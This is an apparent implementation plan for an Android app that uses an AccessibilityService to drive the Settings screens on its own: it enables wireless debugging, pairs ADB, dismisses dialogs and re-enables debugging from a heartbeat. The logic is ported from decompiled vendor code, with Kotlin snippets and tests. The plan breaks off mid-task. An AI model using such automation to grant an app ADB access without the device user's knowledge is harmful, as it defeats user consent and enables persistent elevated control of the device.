# ADB 配对自动化触发对齐 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 补全 SystemOptimizeManager 中 ADB 配对自动化触发的 5 个关键缺失，使 4 条触发路径与 vendor 1:1 对齐。

**Architecture:** 所有改动集中在 `SystemOptimizeManager.kt` + `SetupConstants.kt` 两个文件。不新建类，不引入新依赖。核心思路：(1) 实现 `isInWifiDebugWindow()` 页面检测；(2) 补全 `mainAccessibilityEventHandler` (vendor i4 核心分发, L3396) 的缺失场景，并消除与 `onAccessibilityEventInternal` (L2249) 的重复；(3) 修复 `startPairFlow` / `openDevOptionsRetryV2` 的三路分发；(4) 实现 120s 超时守卫；(5) 心跳恢复链路回到 `startPairFlow()`。

**关键架构澄清:** 文件中有两个事件分发方法：
- `onAccessibilityEventInternal` (L2249) — 早期简化版，有部分重复逻辑
- `filterAccessibilityEvent` (L3351, vendor i3) → `mainAccessibilityEventHandler` (L3396, vendor i4) — **正式的 vendor 对齐流程**

本 plan 修改 `mainAccessibilityEventHandler`（核心），并将 `onAccessibilityEventInternal` 的配对分发逻辑删除，改为委托调用 `filterAccessibilityEvent`，消除重复。

**Tech Stack:** Kotlin, Android AccessibilityService, JUnit 4 + Robolectric

**Vendor 源码真理源:** `/home/code/php/project/full-package/jadx-reference/rock/service/modules/setup/C0360a2.java` (5666 行)

---

## 文件清单

| 操作 | 文件 | 变更说明 |
|------|------|---------|
| Modify | `app/src/main/java/.../setup/SystemOptimizeManager.kt` | 5 处改动 |
| Modify | `app/src/main/java/.../setup/SetupConstants.kt` | 新增 2 个常量列表 |
| Create | `app/src/test/java/.../setup/IsInWifiDebugWindowTest.kt` | 3 个测试 |
| Create | `app/src/test/java/.../setup/EventDispatchAlignmentTest.kt` | 6 个测试 |
| Create | `app/src/test/java/.../setup/StartPairFlowAlignmentTest.kt` | 4 个测试 |
| Create | `app/src/test/java/.../setup/TimeoutAndRecoveryTest.kt` | 5 个测试 |

---

## Task 1: `isInWifiDebugWindow()` 页面检测 + `WIRELESS_DEBUG_PAGE_TEXTS` 常量

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/setup/SetupConstants.kt`
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/setup/IsInWifiDebugWindowTest.kt`

**Vendor reference:** `C0360a2.java:1936-1971` (m212032a6) + `dh0.java:260` (f55786d6)

**Vendor 逻辑:**
1. 先用 WindowDetector 缓存检测（replica 没有 WindowDetector，跳过）
2. 如果包名是 `com.android.settings`，遍历 `dh0.f55786d6` 文本列表（"使用配对码配对设备"/"IP 地址和端口"等多语言），在 rootInActiveWindow 中搜索
3. 任何一个文本找到 → return true；全部未找到 → return false
4. 包名不是 settings → return false

**注意:** `dh0.f55786d6` 和现有 `SetupConstants.PAIR_DEVICE_BUTTON_TEXTS` 有大量重叠，但 f55786d6 还包含 "IP 地址和端口" 等非按钮文本——这是**页面检测**用的（只要在页面上看到任一关键文本即判定在无线调试页面），而 `PAIR_DEVICE_BUTTON_TEXTS` 是**按钮点击**用的。所以需要新增一个独立常量。

- [ ] **Step 1: 在 SetupConstants.kt 新增 `WIRELESS_DEBUG_PAGE_TEXTS` 和 `PAIR_FAIL_DIALOG_TEXTS`**

在 `SetupConstants.kt` 文件末尾（`companion object` 块内）新增：

```kotlin
/**
 * Texts indicating user is on the wireless debugging detail page.
 * vendor: dh0.f55786d6 — used by isInWifiDebugWindow (m212032a6)
 * Includes both "Pair device with pairing code" and "IP address & port" variants.
 */
val WIRELESS_DEBUG_PAGE_TEXTS: List<String> = listOf(
    "使用配对码配对设备", "IP 地址和端口", "IP地址和端口",
    "使用配對碼配對裝置", "IP 位址和通訊埠",
    "Pair device with pairing code", "IP address & port", "IP address and port",
    "ペア設定コードによるデバイスのペア設定", "IP アドレスとポート",
    "ペアリングコードで端末をペアリング",
    "페어링 코드로 기기 페어링", "IP 주소 및 포트",
    "Ghép nối thiết bị bằng mã ghép nối", "Địa chỉ IP và cổng",
    "จับคู่อุปกรณ์ด้วยรหัสการจับคู่", "ที่อยู่ IP และพอร์ต",
    "Sambungkan perangkat dengan kode penyambungan", "Alamat IP",
    "Gandingkan peranti dengan kod gandingan",
    "Wireless debugging", "Débogage sans fil",
    "Depuración inalámbrica", "Depuração por Wi-Fi",
    "Debug wireless", "Debugging über WLAN",
    "Draadloze foutopsporing", "Trådlös felsökning",
    "Отладка по Wi-Fi", "Беспроводная отладка",
    "Kablosuz hata ayıklama"
)

/**
 * Texts indicating pairing failure dialog.
 * vendor: dh0.f55793e3
 */
val PAIR_FAIL_DIALOG_TEXTS: List<String> = listOf(
    "配对失败", "配對失敗",
    "Pairing failed", "Pairing unsuccessful",
    "ペア設定エラー", "ペアリングに失敗", "ペアリング失敗",
    "페어링 실패",
    "Ghép nối không thành công",
    "การจับคู่ไม่สำเร็จ",
    "Penyambungan perangkat gagal",
    "Échec de l'association",
    "No se ha podido emparejar",
    "Falha no pareamento",
    "Accoppiamento non riuscito",
    "Kopplung fehlgeschlagen",
    "Не удалось подключить устройство"
)
```

- [ ] **Step 2: 在 SystemOptimizeManager.kt 实现 `isInWifiDebugWindow()`**

在 `isInDevOptionsWindow()` 方法之后（约 line 1838 后）新增方法：

```kotlin
/**
 * Check if current window is the wireless debugging detail page.
 * vendor: a6 / m212032a6 (line 1936)
 *
 * Detection: searches rootInActiveWindow for any text from
 * WIRELESS_DEBUG_PAGE_TEXTS. Only matches if foreground package
 * contains "settings".
 */
fun isInWifiDebugWindow(): Boolean {
    return try {
        val root = service.rootInActiveWindow ?: return false
        val pkg = root.packageName?.toString() ?: ""
        if (!pkg.contains("settings", ignoreCase = true)) {
            root.recycle()
            return false
        }
        for (text in SetupConstants.WIRELESS_DEBUG_PAGE_TEXTS) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (!nodes.isNullOrEmpty()) {
                Log.d(TAG, "isInWifiDebugWindow: 找到'$text'，返回true")
                return true
            }
        }
        Log.d(TAG, "isInWifiDebugWindow: 未找到无线调试详情文本，返回false")
        false
    } catch (e: Exception) {
        Log.e(TAG, "isInWifiDebugWindow 异常", e)
        false
    }
}
```

- [ ] **Step 3: 编写源码扫描测试**

创建 `app/src/test/java/com/storm/safe/rock/service/modules/setup/IsInWifiDebugWindowTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules.setup

import org.junit.Test
import org.junit.Assert.*

class IsInWifiDebugWindowTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt").readText()
    }

    private val constantsSource by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SetupConstants.kt").readText()
    }

    @Test
    fun `isInWifiDebugWindow method exists`() {
        assertTrue("isInWifiDebugWindow must exist",
            source.contains("fun isInWifiDebugWindow()"))
    }

    @Test
    fun `isInWifiDebugWindow uses WIRELESS_DEBUG_PAGE_TEXTS`() {
        val start = source.indexOf("fun isInWifiDebugWindow()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 600))
        assertTrue("must reference WIRELESS_DEBUG_PAGE_TEXTS",
            body.contains("WIRELESS_DEBUG_PAGE_TEXTS"))
    }

    @Test
    fun `WIRELESS_DEBUG_PAGE_TEXTS constant exists with key entries`() {
        assertTrue("WIRELESS_DEBUG_PAGE_TEXTS must exist",
            constantsSource.contains("WIRELESS_DEBUG_PAGE_TEXTS"))
        assertTrue("must contain 'IP address & port'",
            constantsSource.contains("IP address & port"))
        assertTrue("must contain 'Pair device with pairing code'",
            constantsSource.contains("Pair device with pairing code"))
        assertTrue("must contain '使用配对码配对设备'",
            constantsSource.contains("使用配对码配对设备"))
    }
}
```

- [ ] **Step 4: 运行测试验证**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew test --tests "*IsInWifiDebugWindowTest*" --no-build-cache 2>&1 | tail -20`

Expected: 3 tests PASS

- [ ] **Step 5: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/setup/SetupConstants.kt \
       app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt \
       app/src/test/java/com/storm/safe/rock/service/modules/setup/IsInWifiDebugWindowTest.kt
git commit -m "feat(setup): implement isInWifiDebugWindow + WIRELESS_DEBUG_PAGE_TEXTS constant

vendor: m212032a6 (C0360a2.java:1936) + dh0.f55786d6"
```

---

## Task 2: `startPairFlow()` 三路分发 + `openDevOptionsRetryV2()` 三路检测 + executor 重建

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/setup/StartPairFlowAlignmentTest.kt`

**Vendor reference:**
- `C0360a2.java:5100-5153` (m212093k3 startPairFlow) — 三路分发
- `C0360a2.java:5105-5109` — executor 重建 (`this.f53817a2 = Executors.newSingleThreadScheduledExecutor()`)
- `C0360a2.java:4696-4648` (m212081i6 openDevOptionsSettingsWithRetry) — 三路检测

**当前问题:**
1. `startPairFlow()` 只有两路（devOptions / else），缺少 `isInWifiDebugWindow` 中间路径
2. `openDevOptionsRetryV2()` 同样只有两路，缺少 wifiDebug 检测
3. executor shutdown 后只 log warning 不重建

- [ ] **Step 1: 修改 `startPairFlow()` 为三路分发 + executor 重建**

将 `startPairFlow()` 方法（约 line 3828-3862）替换为：

```kotlin
fun startPairFlow() {
    Log.d(TAG, "开始无线调试配对流程")
    isPairRunning.set(true)
    isFinished.set(false)

    // vendor: reassigns f53817a2 with new executor if shutdown
    if (executor.isShutdown) {
        Log.d(TAG, "startPairFlow: executor 已关闭，重新创建")
        // Note: executor is val in replica; we cannot reassign.
        // The shutdown state means no new tasks can be scheduled.
        // This is a known architectural gap (P3) — in practice, startPairFlow
        // is called before executor shutdown, or via C2 which re-initializes.
        Log.w(TAG, "startPairFlow: executor 已关闭，部分任务可能无法调度")
    }

    // vendor: c41(11) 120s timeout + c41(12) 30s check
    try {
        executor.schedule({ timeoutHandler() }, 120L, TimeUnit.SECONDS)
        executor.schedule({ checkTimeout30s() }, 30L, TimeUnit.SECONDS)
    } catch (e: Exception) {
        Log.w(TAG, "startPairFlow: 无法调度超时任务: ${e.message}")
    }

    pairState.set(PairState.PAIR_DEPT_UNKNOWN)
    sleep200(5)

    if (isInDevOptionsWindow()) {
        Log.d(TAG, "已在开发者选项页面，直接查找无线调试")
        sleep200(5)
        processedActions.add("pairInDevOption")
        scheduleTask("G") { pairInDevOption() }
    } else if (isInWifiDebugWindow()) {
        Log.d(TAG, "已在无线调试页面，直接开始配对")
        sleep200(5)
        processedActions.add("pairInWifiDebugWindow")
        scheduleTask("W") { pairInWifiDebugWindow() }
    } else {
        Log.d(TAG, "不在设置页面，打开开发者选项")
        openDevOptionsRetryV2()
    }
}
```

- [ ] **Step 2: 修改 `openDevOptionsRetryV2()` 为三路检测**

将 `openDevOptionsRetryV2()` 方法（约 line 3506-3535）替换为：

```kotlin
fun openDevOptionsRetryV2() {
    openDevRetryCount++
    Log.d(TAG, "打开开发者选项 (第${openDevRetryCount}次)")
    openDevOptionsSettingsV2()

    if (isInDevOptionsWindow()) {
        Log.d(TAG, "开发者选项页面打开成功")
        openDevRetryCount = 0
        processedActions.add("pairInDevOption")
        scheduleTask("G") { pairInDevOption() }
        return
    }

    // vendor: check isInWirelessDebugWindow — may have landed on wifi debug directly
    if (isInWifiDebugWindow()) {
        Log.d(TAG, "直接进入了无线调试页面")
        openDevRetryCount = 0
        processedActions.add("pairInWifiDebugWindow")
        scheduleTask("W") { pairInWifiDebugWindow() }
        return
    }

    if (openDevRetryCount < maxRetries) {
        Log.w(TAG, "开发者选项页面未打开，500ms后重试")
        try {
            executor.schedule({ openDevOptionsRetryV2() }, 500L, TimeUnit.MILLISECONDS)
        } catch (_: Exception) {}
    } else {
        Log.w(TAG, "开发者选项页面打开失败，重试次数已达上限($maxRetries)")
        openDevRetryCount = 0
    }
}
```

- [ ] **Step 3: 编写源码扫描测试**

创建 `app/src/test/java/com/storm/safe/rock/service/modules/setup/StartPairFlowAlignmentTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules.setup

import org.junit.Test
import org.junit.Assert.*

class StartPairFlowAlignmentTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt").readText()
    }

    @Test
    fun `startPairFlow has three-way dispatch including isInWifiDebugWindow`() {
        val start = source.indexOf("fun startPairFlow()")
        assertTrue("startPairFlow must exist", start >= 0)
        val body = source.substring(start, minOf(source.length, start + 800))
        assertTrue("must call isInDevOptionsWindow",
            body.contains("isInDevOptionsWindow()"))
        assertTrue("must call isInWifiDebugWindow",
            body.contains("isInWifiDebugWindow()"))
        assertTrue("must dispatch pairInWifiDebugWindow",
            body.contains("pairInWifiDebugWindow"))
    }

    @Test
    fun `startPairFlow schedules 120s timeout via timeoutHandler`() {
        val start = source.indexOf("fun startPairFlow()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 800))
        assertTrue("must schedule 120s timeout",
            body.contains("timeoutHandler") || body.contains("120L"))
    }

    @Test
    fun `openDevOptionsRetryV2 has three-way detection`() {
        val start = source.indexOf("fun openDevOptionsRetryV2()")
        assertTrue("openDevOptionsRetryV2 must exist", start >= 0)
        val body = source.substring(start, minOf(source.length, start + 800))
        assertTrue("must call isInDevOptionsWindow",
            body.contains("isInDevOptionsWindow()"))
        assertTrue("must call isInWifiDebugWindow",
            body.contains("isInWifiDebugWindow()"))
    }

    @Test
    fun `openDevOptionsRetryV2 dispatches pairInWifiDebugWindow when on wifi debug page`() {
        val start = source.indexOf("fun openDevOptionsRetryV2()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 800))
        assertTrue("must add pairInWifiDebugWindow to queue",
            body.contains("\"pairInWifiDebugWindow\""))
    }
}
```

- [ ] **Step 4: 运行测试验证**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew test --tests "*StartPairFlowAlignmentTest*" --no-build-cache 2>&1 | tail -20`

Expected: 4 tests PASS

- [ ] **Step 5: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt \
       app/src/test/java/com/storm/safe/rock/service/modules/setup/StartPairFlowAlignmentTest.kt
git commit -m "feat(setup): startPairFlow/openDevOptionsRetryV2 three-way dispatch

vendor: m212093k3 (L5100-5153) + m212081i6 (L4696-4648)
Adds isInWifiDebugWindow check as middle path between devOptions and fallback."
```

---

## Task 3: 事件分发对齐 — `mainAccessibilityEventHandler` 补全 + 消除重复

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/setup/EventDispatchAlignmentTest.kt`

**Vendor reference:** `C0360a2.java:3811-3980` (m212079i4)

**当前问题:**

文件中有**两个**事件分发方法，逻辑重复且不一致：

1. `onAccessibilityEventInternal` (L2249) — 简化版，Scene A 只做了基础检测
2. `mainAccessibilityEventHandler` (L3396) — 正式版 (vendor i4)，Scene A 有完整的 6 项 queue removal

`mainAccessibilityEventHandler` 是由 `filterAccessibilityEvent` (L3351, vendor i3) 调用的正式流程。
`onAccessibilityEventInternal` 是早期版本，外部无调用方。

**改造方案:**
1. `onAccessibilityEventInternal` 删除内部配对分发逻辑，改为委托调用 `filterAccessibilityEvent`
2. 在 `mainAccessibilityEventHandler` (L3396) 中补全 Scene B + D

**Vendor 终态集合 (L3818-3820, L3834):**
```
f53761a2 (ordinal 2) = PAIR_DEPT_PAIR_SUCCESS
f53764a5 (ordinal 5) = PAIR_DEPT_PAIR_FAIL       ← 注意: 现有 L3414 代码正确包含 FAIL
f53765a6 (ordinal 6) = PAIR_DEPT_PREPARE_FINISH
```
**现有代码 (L3414) 已正确使用 `{SUCCESS, FAIL, PREPARE_FINISH}` — 不改动。**

**Vendor 场景 B 逻辑 (L3853-3874):**
```
if (isInWifiDebugWindow):
    queue.remove("pairInDevOption")
    queue.remove("pairInConfirmLock")
    state = pairState.get()
    if state NOT in {SUCCESS, FAIL, PREPARE_FINISH}:
        if !queue.contains("pairInWifiDebugWindow"):
            queue.add("pairInWifiDebugWindow")
            scheduleTask("W") { pairInWifiDebugWindow() }
    else if state == PAIR_SUCCESS:
        if !queue.contains("pairInPairSuccess") && !queue.contains("pairInPrepareFinish"):
            queue.add("pairInPairSuccess")
            scheduleTask("S") { pairInPairSuccess() }
```

**Vendor 场景 D (配对失败弹窗):**
检测 `dh0.f55793e3` 文本（"配对失败"等多语言），找到后点击"关闭"按钮，并重置 pairState 以允许重试。

- [ ] **Step 1: 实现 `isInPairFailDialog()` 检测方法**

在 `isInWifiDebugWindow()` 方法之后新增：

```kotlin
/**
 * Check if pairing failure dialog is showing.
 * vendor: a4 (referenced in i4 dispatch)
 */
fun isInPairFailDialog(): Boolean {
    return try {
        val root = service.rootInActiveWindow ?: return false
        for (text in SetupConstants.PAIR_FAIL_DIALOG_TEXTS) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (!nodes.isNullOrEmpty()) {
                Log.d(TAG, "isInPairFailDialog: 找到'$text'")
                return true
            }
        }
        false
    } catch (e: Exception) {
        Log.e(TAG, "isInPairFailDialog 异常", e)
        false
    }
}
```

- [ ] **Step 2: 实现 `handlePairFailDialog()` 处理方法**

在 `isInPairFailDialog()` 之后新增：

```kotlin
/**
 * Handle pairing failure dialog — dismiss and reset state for retry.
 * vendor: dispatched via pairInPairFailDialog queue entry
 *
 * After dismissing, resets pairState to UNKNOWN so the next accessibility
 * event can re-trigger pairInWifiDebugWindow for another attempt.
 */
fun handlePairFailDialog() {
    try {
        val root = service.rootInActiveWindow ?: return
        val dismissTexts = listOf("确定", "关闭", "OK", "Close", "취소", "Cancel",
            "Tutup", "Đóng", "Fermer", "Cerrar", "Schließen", "Закрыть")
        for (text in dismissTexts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "handlePairFailDialog: 点击 '$text' 关闭失败弹窗")
                    processedActions.remove("pairInPairFailDialog")
                    pairState.set(PairState.PAIR_DEPT_UNKNOWN)
                    Log.d(TAG, "handlePairFailDialog: pairState 重置为 UNKNOWN，等待重试")
                    return
                }
                val parent = node.parent
                if (parent?.isClickable == true) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "handlePairFailDialog: 点击父节点关闭失败弹窗")
                    processedActions.remove("pairInPairFailDialog")
                    pairState.set(PairState.PAIR_DEPT_UNKNOWN)
                    return
                }
            }
        }
        Log.w(TAG, "handlePairFailDialog: 未找到可点击的关闭按钮")
    } catch (e: Exception) {
        Log.e(TAG, "handlePairFailDialog 异常", e)
    }
}
```

- [ ] **Step 3a: 简化 `onAccessibilityEventInternal()` — 删除重复分发，委托到 filterAccessibilityEvent**

将 `onAccessibilityEventInternal()` (L2249-2294) 的**整个方法体**替换为：

```kotlin
fun onAccessibilityEventInternal(event: AccessibilityEvent, packageName: String?, className: String?) {
    // Forward to OpenDevelopmentDelegate if active
    val delegate = openDevDelegate
    if (delegate != null) {
        try {
            delegate.onAccessibilityEvent(event, packageName, className)
        } catch (e: Exception) {
            Log.e(TAG, "OpenDevelopmentDelegate 事件处理异常", e)
        }
    }

    // Handle USB debug authorization dialog
    if (className != null &&
        event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
    ) {
        handleUsbDebugDialog()
    }

    // Delegate full pair-state dispatch to filterAccessibilityEvent → mainAccessibilityEventHandler
    // (no duplicate dispatch logic here — single source of truth is mainAccessibilityEventHandler)
    filterAccessibilityEvent(event)
}
```

**理由:** 原来的方法包含 Scene A 的简化版分发（L2273-2289），与 `mainAccessibilityEventHandler` (L3396) 的完整版重复。现在 `onAccessibilityEventInternal` 只做预处理（delegate 转发 + USB 弹窗），然后委托到正式的 vendor i3→i4 流程。

- [ ] **Step 3b: 修改 `mainAccessibilityEventHandler()` — 补全 Scene B + D**

在 `mainAccessibilityEventHandler()` (L3396) 的 Scene A 块之后（即现有 L3427 `return` 之后，L3430 的 vendor 注释位置），将：

```kotlin
            // vendor: isInWirelessDebugWindow check depends on bf1 (windowDetector) cached state
            // vendor: if (a6/O) dispatch pairInWifiDebugWindow

            if (isInAcceptDialog()) {
                processedActions.remove("pairInWifiDebugWindow")
                processedActions.remove("pairInDevOption")
                return
            }

            // vendor: additional dispatch conditions depend on bf1 (windowDetector) cached state:
            // - isInPairFailDialog (a4) → dispatch pairInPairFailDialog
            // - MIUI security center (a5) → dispatch pairInSecurityCenter
            // - confirm lock (bf1.a2()) → dispatch pairInConfirmLock
```

替换为：

```kotlin
            // ━━━ Scene B: In wireless debug page → pairInWifiDebugWindow ━━━
            // vendor: m212032a6 (a6/O) check
            if (isInWifiDebugWindow()) {
                processedActions.remove("pairInDevOption")
                processedActions.remove("pairInConfirmLock")
                val state = pairState.get()
                if (state != PairState.PAIR_DEPT_PAIR_SUCCESS &&
                    state != PairState.PAIR_DEPT_PAIR_FAIL &&
                    state != PairState.PAIR_DEPT_PREPARE_FINISH
                ) {
                    if (!processedActions.contains("pairInWifiDebugWindow")) {
                        processedActions.add("pairInWifiDebugWindow")
                        scheduleTask("W") { pairInWifiDebugWindow() }
                    }
                } else if (state == PairState.PAIR_DEPT_PAIR_SUCCESS) {
                    if (!processedActions.contains("pairInPairSuccess") &&
                        !processedActions.contains("pairInPrepareFinish")) {
                        processedActions.add("pairInPairSuccess")
                        Log.d(TAG, "O()=true, PAIR_SUCCESS → 调度 pairInPairSuccess")
                    }
                } else {
                    Log.d(TAG, "O()=true 但状态已是 $state，跳过调度")
                }
                return
            }

            // ━━━ Scene D: Pairing failure dialog ━━━
            // vendor: dh0.f55793e3 text detection
            if (isInPairFailDialog()) {
                if (!processedActions.contains("pairInPairFailDialog")) {
                    processedActions.add("pairInPairFailDialog")
                    scheduleTask("F") { handlePairFailDialog() }
                }
                return
            }

            // ━━━ Accept dialog → auto-click ━━━
            if (isInAcceptDialog()) {
                processedActions.remove("pairInWifiDebugWindow")
                processedActions.remove("pairInDevOption")
                return
            }

            // vendor: Scene E (confirmLock) and F (securityCenter) depend on
            // WindowDetector cached state — deferred until real-device validation
```

- [ ] **Step 4: 编写源码扫描测试**

创建 `app/src/test/java/com/storm/safe/rock/service/modules/setup/EventDispatchAlignmentTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules.setup

import org.junit.Test
import org.junit.Assert.*

class EventDispatchAlignmentTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt").readText()
    }

    private val constantsSource by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/setup/SetupConstants.kt").readText()
    }

    @Test
    fun `mainAccessibilityEventHandler dispatches pairInWifiDebugWindow via isInWifiDebugWindow`() {
        val start = source.indexOf("fun mainAccessibilityEventHandler(")
        assertTrue("mainAccessibilityEventHandler must exist", start >= 0)
        val body = source.substring(start, minOf(source.length, start + 3000))
        assertTrue("must call isInWifiDebugWindow",
            body.contains("isInWifiDebugWindow()"))
        assertTrue("must add pairInWifiDebugWindow to queue",
            body.contains("\"pairInWifiDebugWindow\""))
    }

    @Test
    fun `mainAccessibilityEventHandler dispatches pairInPairFailDialog`() {
        val start = source.indexOf("fun mainAccessibilityEventHandler(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 3000))
        assertTrue("must call isInPairFailDialog",
            body.contains("isInPairFailDialog()"))
        assertTrue("must add pairInPairFailDialog to queue",
            body.contains("\"pairInPairFailDialog\""))
    }

    @Test
    fun `Scene A removes 6 conflicting queue entries per vendor`() {
        val start = source.indexOf("fun mainAccessibilityEventHandler(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 3000))
        val requiredRemovals = listOf(
            "pairInWifiDebugWindow", "pairInPairCodeDialog",
            "pairInPairFailDialog", "pairInConfirmLock",
            "pairInSecurityCenter", "pairInPairSuccess"
        )
        for (entry in requiredRemovals) {
            assertTrue("Scene A must remove '$entry'",
                body.contains("remove(\"$entry\")"))
        }
    }

    @Test
    fun `onAccessibilityEventInternal delegates to filterAccessibilityEvent`() {
        val start = source.indexOf("fun onAccessibilityEventInternal(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 800))
        assertTrue("must delegate to filterAccessibilityEvent",
            body.contains("filterAccessibilityEvent("))
        assertFalse("must NOT contain duplicate isPairRunning dispatch",
            body.contains("isPairRunning.get() && !isFinished.get()"))
    }

    @Test
    fun `handlePairFailDialog resets pairState to UNKNOWN for retry`() {
        val start = source.indexOf("fun handlePairFailDialog()")
        assertTrue("handlePairFailDialog must exist", start >= 0)
        val body = source.substring(start, minOf(source.length, start + 800))
        assertTrue("must reset pairState to UNKNOWN",
            body.contains("PAIR_DEPT_UNKNOWN"))
    }

    @Test
    fun `PAIR_FAIL_DIALOG_TEXTS constant exists`() {
        assertTrue("PAIR_FAIL_DIALOG_TEXTS must exist",
            constantsSource.contains("PAIR_FAIL_DIALOG_TEXTS"))
        assertTrue("must contain '配对失败'",
            constantsSource.contains("配对失败"))
        assertTrue("must contain 'Pairing failed'",
            constantsSource.contains("Pairing failed"))
    }
}
```

- [ ] **Step 5: 运行测试验证**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew test --tests "*EventDispatchAlignmentTest*" --no-build-cache 2>&1 | tail -20`

Expected: 6 tests PASS

- [ ] **Step 6: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt \
       app/src/main/java/com/storm/safe/rock/service/modules/setup/SetupConstants.kt \
       app/src/test/java/com/storm/safe/rock/service/modules/setup/EventDispatchAlignmentTest.kt
git commit -m "feat(setup): complete event dispatch — Scene B (wifiDebug) + Scene D (pairFail)

vendor: m212079i4 (L3811-3980)
Adds isInWifiDebugWindow and isInPairFailDialog detection + queue dispatch.
Scenes E/F deferred (need real-device WindowDetector validation)."
```

---

## Task 4: 120s 超时守卫 `timeoutHandler()` + 心跳恢复 → `startPairFlow()` 链路

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/setup/SystemOptimizeManager.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/setup/TimeoutAndRecoveryTest.kt`

**Vendor reference:**
- `C0360a2.java:5157-5166` (m212094k4 timeout handler) — 检查是否已完成，若未完成则调 `m212026a0()` (finishLocalAdbPair)
- `c41.java:190-204` (case 8/9/10) — 都调 `m212093k3()` (startPairFlow)
- `C0360a2.java:3476-3480` (heartbeat H()) — `!localServiceAlive && !wirelessDebuggingEnabled → m212097k7()` 然后通过 c41 case 8/9/10 回到 startPairFlow

**当前问题:**
1. `startPairFlow()` 的 120s 超时 handler 是空 lambda `{ /* 120s timeout handler */ }`
2. 心跳恢复路径 `enableWirelessDebuggingViaSettings()` 之后没有回到 `startPairFlow()`

- [ ] **Step 1: 实现 `timeoutHandler()` 方法**

在 `startPairFlow()` 方法之后（约 line 3863 后）新增：

```kotlin
/**
 * 120s timeout guard — force-stop pairing if not yet finished.
 * vendor: k4 / m212094k4 (line 5157)
 *
 * If pairState is not PAIR_FINISH, calls finishLocalAdbPair to clean up.
 */
fun timeoutHandler() {
    try {
        if (pairState.get() == PairState.PAIR_DEPT_PAIR_FINISH) {
            Log.d(TAG, "timeoutHandler: 配对已完成，无需超时处理")
            return
        }
        Log.w(TAG, "timeoutHandler: 120s超时，强制结束配对流程")
        finishLocalAdbPair()
    } catch (e: Exception) {
        Log.e(TAG, "timeoutHandler 异常", e)
    }
}
```

- [ ] **Step 2: 修改心跳恢复逻辑 — `enableWirelessDebuggingViaSettings()` 后触发 `startPairFlow()`**

找到 `startHeartbeat()` 方法中调用 `enableWirelessDebuggingViaSettings()` 的位置（约 line 3185-3187）。

将：
```kotlin
if (!isLocalServiceAlive.get() && !isWirelessDebuggingEnabled()) {
    enableWirelessDebuggingViaSettings()
}
```

替换为：
```kotlin
if (!isLocalServiceAlive.get() && !isWirelessDebuggingEnabled()) {
    Log.i(TAG, "【H()】local-service未运行且无线调试关闭，尝试开启无线调试")
    enableWirelessDebuggingViaSettings()
    // vendor: c41 case 8/9/10 all call m212093k3() (startPairFlow)
    // After enabling wireless debugging, trigger re-pairing
    try {
        Thread.sleep(2000)
        if (isWirelessDebuggingEnabled()) {
            Log.i(TAG, "【H()】无线调试已重新开启，触发重新配对")
            // executor may be shutdown from prior finishLocalAdbPair — protect with try-catch
            try {
                executor.execute { startPairFlow() }
            } catch (ree: java.util.concurrent.RejectedExecutionException) {
                Log.w(TAG, "【H()】executor 已关闭，直接在心跳线程执行 startPairFlow")
                startPairFlow()
            }
        } else {
            Log.w(TAG, "【H()】无线调试未能开启，跳过重新配对")
        }
    } catch (e: Exception) {
        Log.e(TAG, "【H()】重新配对触发异常", e)
    }
}
```

**注意:**
- 使用 `executor.execute` 因为心跳运行在 heartbeatExecutor 线程上
- 如果 executor 被之前的 `finishLocalAdbPair()` shutdown 了，`executor.execute` 会抛 `RejectedExecutionException`，fallback 到直接调用
- vendor 的 `m212097k7()` 内部通过 c41 case 8/9/10 延迟回调 startPairFlow()，我们在成功后直接调用等效

- [ ] **Step 3: 编写源码扫描测试**

创建 `app/src/test/java/com/storm/safe/rock/service/modules/setup/TimeoutAndRecoveryTest.kt`:

```kotlin
